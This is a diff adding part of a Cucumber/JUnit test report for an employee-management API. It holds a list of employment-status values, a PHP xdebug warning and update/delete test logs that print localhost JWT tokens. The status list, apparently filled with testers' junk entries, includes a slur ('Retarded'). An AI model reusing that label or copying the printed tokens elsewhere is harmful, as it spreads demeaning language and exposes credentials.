+            "name": "probation status"
+        },
+        {
+            "id": "288",
+            "name": "str"
+        },
+        {
+            "id": "289",
+            "name": "Senior Manager"
+        },
+        {
+            "id": "290",
+            "name": "in training"
+        },
+        {
+            "id": "291",
+            "name": "Permanent Employee"
+        },
+        {
+            "id": "292",
+            "name": "Ololo"
+        },
+        {
+            "id": "293",
+            "name": "normal"
+        },
+        {
+            "id": "294",
+            "name": "probabtion"
+        },
+        {
+            "id": "295",
+            "name": "freelancer"
+        },
+        {
+            "id": "296",
+            "name": "provition"
+        },
+        {
+            "id": "297",
+            "name": "whatevs"
+        },
+        {
+            "id": "298",
+            "name": "Good"
+        },
+        {
+            "id": "299",
+            "name": "Nice"
+        },
+        {
+            "id": "300",
+            "name": "QA Manager"
+        },
+        {
+            "id": "301",
+            "name": "Engee"
+        },
+        {
+            "id": "302",
+            "name": "Past"
+        },
+        {
+            "id": "303",
+            "name": "great"
+        },
+        {
+            "id": "304",
+            "name": "update"
+        },
+        {
+            "id": "305",
+            "name": "fine"
+        },
+        {
+            "id": "306",
+            "name": "Big Boss CEO"
+        },
+        {
+            "id": "307",
+            "name": "Big Boss Self-Employed"
+        },
+        {
+            "id": "308",
+            "name": "happiness counselor"
+        },
+        {
+            "id": "309",
+            "name": "hard worker"
+        },
+        {
+            "id": "310",
+            "name": "maybe"
+        },
+        {
+            "id": "311",
+            "name": "IT"
+        },
+        {
+            "id": "312",
+            "name": "Junior"
+        },
+        {
+            "id": "313",
+            "name": "Just a baby"
+        },
+        {
+            "id": "314",
+            "name": "ghfhg"
+        },
+        {
+            "id": "315",
+            "name": "Shoeshinner"
+        },
+        {
+            "id": "316",
+            "name": "None Of your Business"
+        },
+        {
+            "id": "317",
+            "name": "Gamer"
+        },
+        {
+            "id": "318",
+            "name": "bartender"
+        },
+        {
+            "id": "319",
+            "name": "status"
+        },
+        {
+            "id": "320",
+            "name": "ring"
+        },
+        {
+            "id": "321",
+            "name": "new"
+        },
+        {
+            "id": "322",
+            "name": "colorBlind"
+        },
+        {
+            "id": "323",
+            "name": "mecanografo"
+        },
+        {
+            "id": "324",
+            "name": "Olaolo"
+        },
+        {
+            "id": "325",
+            "name": "Cute"
+        },
+        {
+            "id": "326",
+            "name": "Self Employed Big Boss"
+        },
+        {
+            "id": "327",
+            "name": "under contract"
+        },
+        {
+            "id": "328",
+            "name": "unemployee"
+        },
+        {
+            "id": "329",
+            "name": "Deceased"
+        },
+        {
+            "id": "330",
+            "name": "main"
+        },
+        {
+            "id": "331",
+            "name": "greate"
+        },
+        {
+            "id": "332",
+            "name": "Aghu"
+        },
+        {
+            "id": "333",
+            "name": "II"
+        },
+        {
+            "id": "334",
+            "name": "Rich"
+        },
+        {
+            "id": "335",
+            "name": "faired"
+        },
+        {
+            "id": "336",
+            "name": "perfect"
+        },
+        {
+            "id": "337",
+            "name": "stronstrong"
+        },
+        {
+            "id": "338",
+            "name": "special employee"
+        },
+        {
+            "id": "339",
+            "name": "special M"
+        },
+        {
+            "id": "340",
+            "name": "Saman Cha"
+        },
+        {
+            "id": "341",
+            "name": "India Prime Minister"
+        },
+        {
+            "id": "342",
+            "name": "rehired"
+        },
+        {
+            "id": "343",
+            "name": "KIA"
+        },
+        {
+            "id": "344",
+            "name": "special"
+        },
+        {
+            "id": "345",
+            "name": "PartTime"
+        },
+        {
+            "id": "346",
+            "name": "Employes"
+        },
+        {
+            "id": "347",
+            "name": "Maki"
+        },
+        {
+            "id": "348",
+            "name": "Company pet"
+        },
+        {
+            "id": "349",
+            "name": "Freeeeeee"
+        },
+        {
+            "id": "350",
+            "name": "some"
+        },
+        {
+            "id": "351",
+            "name": "enginner"
+        },
+        {
+            "id": "352",
+            "name": "bride"
+        },
+        {
+            "id": "353",
+            "name": "Very Good"
+        },
+        {
+            "id": "354",
+            "name": "Permenant"
+        },
+        {
+            "id": "355",
+            "name": "Software Developer"
+        },
+        {
+            "id": "356",
+            "name": "Khayamal"
+        },
+        {
+            "id": "357",
+            "name": "FAKIR"
+        },
+        {
+            "id": "358",
+            "name": "champion"
+        },
+        {
+            "id": "359",
+            "name": "World champion"
+        },
+        {
+            "id": "360",
+            "name": "added"
+        },
+        {
+            "id": "361",
+            "name": "confirned"
+        },
+        {
+            "id": "362",
+            "name": "Cont"
+        },
+        {
+            "id": "363",
+            "name": "confirmed employee"
+        },
+        {
+            "id": "364",
+            "name": "not Employed"
+        },
+        {
+            "id": "365",
+            "name": "abc"
+        },
+        {
+            "id": "366",
+            "name": "activeg"
+        },
+        {
+            "id": "367",
+            "name": "test"
+        },
+        {
+            "id": "368",
+            "name": "bcdhhd"
+        },
+        {
+            "id": "369",
+            "name": "confrimed"
+        },
+        {
+            "id": "370",
+            "name": "QA engineer"
+        },
+        {
+            "id": "371",
+            "name": "Confirmed!"
+        },
+        {
+            "id": "372",
+            "name": "conform"
+        },
+        {
+            "id": "373",
+            "name": "APPROVED"
+        },
+        {
+            "id": "374",
+            "name": "Automation Engineer"
+        },
+        {
+            "id": "375",
+            "name": "thankfull"
+        },
+        {
+            "id": "376",
+            "name": "prohation"
+        },
+        {
+            "id": "377",
+            "name": "probtion"
+        },
+        {
+            "id": "378",
+            "name": "prob"
+        },
+        {
+            "id": "379",
+            "name": "Promation"
+        },
+        {
+            "id": "380",
+            "name": "unactive"
+        },
+        {
+            "id": "381",
+            "name": "active emp"
+        },
+        {
+            "id": "382",
+            "name": "Person"
+        },
+        {
+            "id": "383",
+            "name": "classified"
+        },
+        {
+            "id": "384",
+            "name": "conf"
+        },
+        {
+            "id": "385",
+            "name": "Retarded"
+        },
+        {
+            "id": "386",
+            "name": "Automation Engineering"
+        },
+        {
+            "id": "387",
+            "name": "Promotion"
+        },
+        {
+            "id": "388",
+            "name": "R"
+        },
+        {
+            "id": "389",
+            "name": "pron"
+        },
+        {
+            "id": "390",
+            "name": "Full Person"
+        },
+        {
+            "id": "391",
+            "name": "active employee"
+        },
+        {
+            "id": "392",
+            "name": "Permanen"
+        },
+        {
+            "id": "393",
+            "name": "Permanentt"
+        },
+        {
+            "id": "394",
+            "name": "Temp-contracted"
+        },
+        {
+            "id": "395",
+            "name": "Automation"
+        },
+        {
+            "id": "396",
+            "name": "practice"
+        },
+        {
+            "id": "397",
+            "name": "maternityleave"
+        },
+        {
+            "id": "398",
+            "name": "Unknown"
+        },
+        {
+            "id": "399",
+            "name": "activ"
+        },
+        {
+            "id": "400",
+            "name": "actemp"
+        },
+        {
+            "id": "401",
+            "name": "replacement"
+        },
+        {
+            "id": "402",
+            "name": " Not probation"
+        },
+        {
+            "id": "403",
+            "name": "abcd"
+        },
+        {
+            "id": "404",
+            "name": "Volunteer"
+        },
+        {
+            "id": "405",
+            "name": "BOOLEAN"
+        },
+        {
+            "id": "406",
+            "name": "excellent"
+        },
+        {
+            "id": "407",
+            "name": "Emploeyed 4 Life"
+        },
+        {
+            "id": "408",
+            "name": "full-time employment"
+        },
+        {
+            "id": "409",
+            "name": "Any time"
+        },
+        {
+            "id": "410",
+            "name": "active!"
+        },
+        {
+            "id": "411",
+            "name": "QA Lead"
+        },
+        {
+            "id": "412",
+            "name": "m"
+        },
+        {
+            "id": "413",
+            "name": "Rpm"
+        },
+        {
+            "id": "414",
+            "name": "dj"
+        },
+        {
+            "id": "415",
+            "name": "updated"
+        },
+        {
+            "id": "416",
+            "name": "Contrzctor"
+        },
+        {
+            "id": "417",
+            "name": "ProbationV5"
+        },
+        {
+            "id": "418",
+            "name": "abracadabra"
+        },
+        {
+            "id": "419",
+            "name": "taken"
+        },
+        {
+            "id": "420",
+            "name": "Lazy"
+        },
+        {
+            "id": "421",
+            "name": "Unemploy"
+        },
+        {
+            "id": "422",
+            "name": "N\/A"
+        },
+        {
+            "id": "423",
+            "name": "stringxcx"
+        },
+        {
+            "id": "424",
+            "name": "clerk"
+        },
+        {
+            "id": "425",
+            "name": "noEmployee"
+        },
+        {
+            "id": "426",
+            "name": "sleeping"
+        },
+        {
+            "id": "427",
+            "name": "Ok"
+        },
+        {
+            "id": "428",
+            "name": "prep"
+        },
+        {
+            "id": "429",
+            "name": "confirmed FT"
+        },
+        {
+            "id": "430",
+            "name": "Maternity-leave"
+        }
+    ]
+}<br />
+<font size='1'><table class='xdebug-error xe-warning' dir='ltr' border='1' cellspacing='0' cellpadding='1'>
+<tr><th align='left' bgcolor='#f57900' colspan="5"><span style='background-color: #cc0000; color: #fce94f; font-size: x-large;'>( ! )</span> Warning: Cannot modify header information - headers already sent by (output started at C:\wamp64\www\syntaxApi\api\employeementStatus.php:33) in C:\wamp64\www\syntaxApi\api\employeementStatus.php on line <i>34</i></th></tr>
+<tr><th align='left' bgcolor='#e9b96e' colspan='5'>Call Stack</th></tr>
+<tr><th align='center' bgcolor='#eeeeec'>#</th><th align='left' bgcolor='#eeeeec'>Time</th><th align='left' bgcolor='#eeeeec'>Memory</th><th align='left' bgcolor='#eeeeec'>Function</th><th align='left' bgcolor='#eeeeec'>Location</th></tr>
+<tr><td bgcolor='#eeeeec' align='center'>1</td><td bgcolor='#eeeeec' align='center'>0.0001</td><td bgcolor='#eeeeec' align='right'>399824</td><td bgcolor='#eeeeec'>{main}(  )</td><td title='C:\wamp64\www\syntaxApi\api\employeementStatus.php' bgcolor='#eeeeec'>...\employeementStatus.php<b>:</b>0</td></tr>
+<tr><td bgcolor='#eeeeec' align='center'>2</td><td bgcolor='#eeeeec' align='center'>0.0049</td><td bgcolor='#eeeeec' align='right'>682048</td><td bgcolor='#eeeeec'><a href='http://www.php.net/function.header' target='_new'>header</a>
+(  )</td><td title='C:\wamp64\www\syntaxApi\api\employeementStatus.php' bgcolor='#eeeeec'>...\employeementStatus.php<b>:</b>34</td></tr>
+</table></font>
+
+  And response time is no exceed 300 ms                   # APISteps.GetEmployeeEmploymentStatus.response_time_is_no_exceed_ms(java.lang.Integer)
+]]></system-out>
+  </testcase>
+  <testcase name="api test to update full employee information" classname="API workflow test" time="0.345">
+    <system-out><![CDATA[
+@api
+Scenario: api test to update full employee information            # src/test/resources/features/APITesting.feature:50
+{
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzQ2OTk2OTUsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY3NDc0Mjg5NSwidXNlcklkIjoiNTAzNiJ9.d1RjEkkWNMS6EvaDS43KLOi-63inXeBm0w54LnXfwNo"
+}
+  Given JWT is generated                                          # APISteps.GenerateTokenStep.jwt_is_generated()
+  Given request is made to update full employee information       # APISteps.FullyUpdateEmployeeInformation.request_is_made_to_update_full_employee_information(io.cucumber.datatable.DataTable)
+  When put call is prepared                                       # APISteps.FullyUpdateEmployeeInformation.put_call_is_prepared()
+  Then status code is 200                                         # APISteps.CreateNewEmployee.status_code_is(java.lang.Integer)
+{
+    "Message": "Employee record Updated",
+    "Employee": {
+        "emp_firstname": "Adam",
+        "emp_middle_name": "RS",
+        "emp_lastname": "Gurava",
+        "emp_birthday": "1992-10-09",
+        "emp_gender": "Male",
+        "emp_job_title": "QA Automation",
+        "emp_status": "employed"
+    }
+}
+  And expected "Message" contains value "Employee record Updated" # APISteps.FullyUpdateEmployeeInformation.expected_contains_value(java.lang.String,java.lang.String)
+  And updated fields match with provided information              # APISteps.FullyUpdateEmployeeInformation.updated_fields_match_with_provided_information(io.cucumber.datatable.DataTable)
+]]></system-out>
+  </testcase>
+  <testcase name="api test to delete employee" classname="API workflow test" time="0.293">
+    <system-out><![CDATA[
+@api
+Scenario: api test to delete employee                          # src/test/resources/features/APITesting.feature:62
+{
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzQ2OTk2OTYsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY3NDc0Mjg5NiwidXNlcklkIjoiNTAzNiJ9.cYKtiHJzv4z65QxJNae7MneLvi6v7yRc2gGcpP84akY"
+}
+  Given JWT is generated                                       # APISteps.GenerateTokenStep.jwt_is_generated()
+  Given request is made to delete employee                     # APISteps.DeleteEmployee.request_is_made_to_delete_employee()
+  When delete call is prepared                                 # APISteps.DeleteEmployee.delete_call_is_prepared()
+  Then status code is 200                                      # APISteps.CreateNewEmployee.status_code_is(java.lang.Integer)
+{
+    "message": "Employee deleted",
+    "employee": {
+        "employee_id": "51659A",
+        "emp_firstname": "Adam",
+        "emp_middle_name": "RS",
+        "emp_lastname": "Gurava",
+        "emp_birthday": "1992-10-09",
+        "emp_gender": "Male"
+    }
+}
+  And expected "message" contains value "Employee deleted"     # APISteps.FullyUpdateEmployeeInformation.expected_contains_value(java.lang.String,java.lang.String)
+{
+    "message": "Employee deleted",
+    "employee": {
+        "employee_id": "51659A",
+        "emp_firstname": "Adam",
+        "emp_middle_name": "RS",
+        "emp_lastname": "Gurava",
+        "emp_birthday": "1992-10-09",
+        "emp_gender": "Male"
+    }
+}
+  And "employee.employee_id" match with employee id in globals # APISteps.DeleteEmployee.match_with_employee_id_in_globals(java.lang.String)
+{
+    "message": "Employee deleted",
+    "employee": {
+        "employee_id": "51659A",
+        "emp_firstname": "Adam",
+        "emp_middle_name": "RS",
+        "emp_lastname": "Gurava",
+        "emp_birthday": "1992-10-09",
+        "emp_gender": "Male"
+    }
+}
+  And response time is no exceed 250 ms                        # APISteps.GetEmployeeEmploymentStatus.response_time_is_no_exceed_ms(java.lang.Integer)
+]]></system-out>
+  </testcase>
+</testsuite>
